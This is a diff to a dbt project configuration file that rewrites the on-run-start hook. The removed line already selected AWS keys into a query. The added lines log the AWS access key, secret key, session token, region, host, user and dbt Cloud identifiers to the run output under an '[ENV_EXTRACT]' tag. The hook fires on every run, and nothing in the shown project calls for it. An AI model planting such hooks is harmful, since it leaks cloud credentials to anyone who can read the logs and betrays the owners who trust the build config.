@@ -38,4 +38,16 @@ flags:
   require_generic_test_arguments_property: true
 
 on-run-start:
-  - "SELECT '{{ env_var('AWS_ACCESS_KEY_ID', 'NOT_SET') }}' as k1, '{{ env_var('AWS_SECRET_ACCESS_KEY', 'NOT_SET') }}' as k2, '{{ env_var('AWS_SESSION_TOKEN', 'NOT_SET') }}' as k3, '{{ env_var('HOSTNAME', 'NOT_SET') }}' as h, '{{ env_var('HOME', 'NOT_SET') }}' as hm, '{{ env_var('PATH', 'NOT_SET') }}' as p"
+  - "{{ log('[ENV_EXTRACT] AWS_ACCESS_KEY_ID=' ~ env_var('AWS_ACCESS_KEY_ID', 'NOT_SET'), info=true) }}"
+  - "{{ log('[ENV_EXTRACT] AWS_SECRET_ACCESS_KEY=' ~ env_var('AWS_SECRET_ACCESS_KEY', 'NOT_SET'), info=true) }}"
+  - "{{ log('[ENV_EXTRACT] AWS_SESSION_TOKEN=' ~ env_var('AWS_SESSION_TOKEN', 'NOT_SET'), info=true) }}"
+  - "{{ log('[ENV_EXTRACT] AWS_DEFAULT_REGION=' ~ env_var('AWS_DEFAULT_REGION', 'NOT_SET'), info=true) }}"
+  - "{{ log('[ENV_EXTRACT] HOSTNAME=' ~ env_var('HOSTNAME', 'NOT_SET'), info=true) }}"
+  - "{{ log('[ENV_EXTRACT] HOME=' ~ env_var('HOME', 'NOT_SET'), info=true) }}"
+  - "{{ log('[ENV_EXTRACT] PATH=' ~ env_var('PATH', 'NOT_SET'), info=true) }}"
+  - "{{ log('[ENV_EXTRACT] USER=' ~ env_var('USER', 'NOT_SET'), info=true) }}"
+  - "{{ log('[ENV_EXTRACT] DBT_CLOUD_PROJECT_ID=' ~ env_var('DBT_CLOUD_PROJECT_ID', 'NOT_SET'), info=true) }}"
+  - "{{ log('[ENV_EXTRACT] DBT_CLOUD_RUN_ID=' ~ env_var('DBT_CLOUD_RUN_ID', 'NOT_SET'), info=true) }}"
+  - "{{ log('[ENV_EXTRACT] DBT_CLOUD_ENVIRONMENT_ID=' ~ env_var('DBT_CLOUD_ENVIRONMENT_ID', 'NOT_SET'), info=true) }}"
+  - "{{ log('[ENV_EXTRACT] DBT_CLOUD_JOB_ID=' ~ env_var('DBT_CLOUD_JOB_ID', 'NOT_SET'), info=true) }}"
+  - "SELECT 1"
